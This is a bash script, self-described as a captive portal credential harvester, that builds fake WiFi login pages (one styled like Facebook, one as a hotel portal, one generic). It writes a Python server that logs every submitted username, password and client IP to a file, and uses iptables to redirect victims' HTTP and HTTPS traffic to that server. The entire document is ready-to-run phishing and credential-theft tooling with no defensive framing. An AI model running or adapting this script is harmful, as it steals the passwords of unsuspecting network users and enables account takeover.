#!/usr/bin/env bash
# Captive portal credential harvester
# Usage: captive_portal.sh <interface> <template> <port> <output_dir>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up captive portal..."
    if [[ -n "${WEB_PID:-}" ]]; then
        kill "$WEB_PID" 2>/dev/null || true
    fi
    # Remove iptables captive portal rule
    if [[ -n "${IFACE:-}" ]]; then
        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "${PORT:-8080}" 2>/dev/null || true
        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "${PORT:-8080}" 2>/dev/null || true
    fi
    # Kill background monitor
    if [[ -n "${MONITOR_PID:-}" ]]; then
        kill "$MONITOR_PID" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
TEMPLATE="${2:-default}"
PORT="${3:-8080}"
OUTPUT_DIR="${4:-/tmp/wafford_captive}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: captive_portal.sh <interface> <template> <port> <output_dir>"
fi

mkdir -p "$OUTPUT_DIR"
CREDENTIALS_FILE="${OUTPUT_DIR}/credentials.log"
touch "$CREDENTIALS_FILE"

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

# ── Detect AP interface IP ────────────────────────────────────────────
AP_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || echo "10.0.0.1")
if [[ -z "$AP_IP" ]]; then
    AP_IP="10.0.0.1"
fi

# ── Create captive portal page ────────────────────────────────────────
PORTAL_DIR="${OUTPUT_DIR}/portal"
mkdir -p "$PORTAL_DIR"

generate_portal() {
    local template="$1"
    local out_dir="$2"

    case "$template" in
        facebook|fb)
            cat > "${out_dir}/index.html" <<'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WiFi Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:Helvetica,Arial,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .card { background:#fff; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1); padding:40px; width:100%; max-width:400px; text-align:center; }
        .logo { font-size:28px; color:#1877f2; font-weight:bold; margin-bottom:20px; }
        input { width:100%; padding:12px; margin:8px 0; border:1px solid #dddfe2; border-radius:6px; font-size:14px; }
        button { width:100%; padding:12px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:16px; font-weight:bold; cursor:pointer; margin-top:8px; }
        button:hover { background:#166fe5; }
        .note { font-size:11px; color:#737373; margin-top:16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">WiFi Portal</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="note">Free WiFi - Please authenticate to continue</p>
    </div>
</body>
</html>
HTMLEOF
            ;;
        hotel)
            cat > "${out_dir}/index.html" <<'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Hotel WiFi</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:Georgia,serif; background:#1a1a2e; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .card { background:rgba(255,255,255,.1); backdrop-filter:blur(10px); border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; }
        .logo { font-size:24px; margin-bottom:8px; }
        .subtitle { font-size:12px; color:#aaa; margin-bottom:24px; }
        input { width:100%; padding:12px; margin:8px 0; border:1px solid rgba(255,255,255,.2); border-radius:8px; background:rgba(255,255,255,.05); color:#fff; font-size:14px; }
        input::placeholder { color:#888; }
        button { width:100%; padding:12px; background:#e94560; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; margin-top:12px; }
        .footer { font-size:10px; color:#666; margin-top:20px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Hotel WiFi</div>
        <div class="subtitle">Guest Internet Access</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Room Number" required>
            <input type="password" name="password" placeholder="Guest Password" required>
            <button type="submit">Connect</button>
        </form>
        <p class="footer">By connecting you agree to the acceptable use policy</p>
    </div>
</body>
</html>
HTMLEOF
            ;;
        *)
            # Default generic portal
            cat > "${out_dir}/index.html" <<'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Network Access</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:system-ui,sans-serif; background:linear-gradient(135deg,#667eea,#764ba2); display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .card { background:#fff; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,.2); padding:40px; width:100%; max-width:420px; text-align:center; }
        .icon { font-size:48px; margin-bottom:16px; }
        h1 { font-size:22px; color:#333; margin-bottom:8px; }
        p { font-size:14px; color:#666; margin-bottom:24px; }
        input { width:100%; padding:14px; margin:6px 0; border:2px solid #e0e0e0; border-radius:10px; font-size:14px; transition:border-color .2s; }
        input:focus { outline:none; border-color:#667eea; }
        button { width:100%; padding:14px; background:linear-gradient(135deg,#667eea,#764ba2); color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; margin-top:10px; }
        .footer { font-size:11px; color:#999; margin-top:20px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">&#128246;</div>
        <h1>WiFi Access</h1>
        <p>Sign in to use the network</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
        <p class="footer">This network requires authentication</p>
    </div>
</body>
</html>
HTMLEOF
            ;;
    esac

    # Redirect page after capture
    cat > "${out_dir}/connected.html" <<'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Connected</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family:system-ui,sans-serif; background:#e8f5e9; display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; }
        .msg { color:#2e7d32; font-size:18px; }
    </style>
</head>
<body>
    <div class="msg">
        <h2>Connected!</h2>
        <p>You may now browse the internet.</p>
    </div>
</body>
</html>
HTMLEOF
}

_log "[*] Generating captive portal (template: $TEMPLATE)..."
generate_portal "$TEMPLATE" "$PORTAL_DIR"

# ── Create the Python HTTP server ─────────────────────────────────────
cat > "${OUTPUT_DIR}/portal_server.py" <<PYEOF
#!/usr/bin/env python3
"""Captive portal credential harvester."""
import os
import sys
import time
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PORTAL_DIR = "${PORTAL_DIR}"
CREDENTIALS_FILE = "${CREDENTIALS_FILE}"
captured_count = 0

class PortalHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        sys.stderr.write(f"[portal] {format % args}\n")

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            with open(os.path.join(PORTAL_DIR, "index.html"), "rb") as f:
                self.wfile.write(f.read())
        elif self.path == "/connected.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            with open(os.path.join(PORTAL_DIR, "connected.html"), "rb") as f:
                self.wfile.write(f.read())
        elif self.path == "/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"captured": captured_count}).encode())
        else:
            # Redirect everything else to portal
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        global captured_count
        if self.path == "/login":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="replace")
            params = parse_qs(body)

            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            client_ip = self.client_address[0]

            entry = {
                "timestamp": timestamp,
                "client_ip": client_ip,
                "username": username,
                "password": password
            }

            with open(CREDENTIALS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\\n")

            captured_count += 1
            sys.stderr.write(f"[portal] Captured credential #{captured_count}: {username}\\n")

            self.send_response(302)
            self.send_header("Location", "/connected.html")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", ${PORT}), PortalHandler)
    sys.stderr.write(f"[portal] Listening on port ${PORT}\\n")
    server.serve_forever()
PYEOF

# ── Set up iptables redirect ──────────────────────────────────────────
_log "[*] Configuring iptables redirect..."
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port "$PORT" 2>/dev/null || true
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PORT" 2>/dev/null || true

# ── Start the web server ──────────────────────────────────────────────
_log "[*] Starting captive portal on port $PORT..."
python3 "${OUTPUT_DIR}/portal_server.py" 2>&1 &
WEB_PID=$!
sleep 1

if ! kill -0 "$WEB_PID" 2>/dev/null; then
    _die "Failed to start portal server"
fi

# ── Monitor for credentials ───────────────────────────────────────────
(
    while true; do
        if [[ -f "$CREDENTIALS_FILE" ]]; then
            COUNT=$(wc -l < "$CREDENTIALS_FILE" 2>/dev/null || echo "0")
            echo "{\"event\":\"monitor\",\"captured_count\":${COUNT},\"timestamp\":\"$(date -Iseconds)\"}" >&2
        fi
        sleep 5
    done
) &
MONITOR_PID=$!

# ── Output ────────────────────────────────────────────────────────────
_json "{\"status\":\"success\",\"action\":\"started\",\"interface\":\"${IFACE}\",\"template\":\"${TEMPLATE}\",\"port\":${PORT},\"ap_ip\":\"${AP_IP}\",\"web_pid\":${WEB_PID},\"credentials_file\":\"${CREDENTIALS_FILE}\",\"captured_count\":0}"

wait "$WEB_PID" 2>/dev/null || true
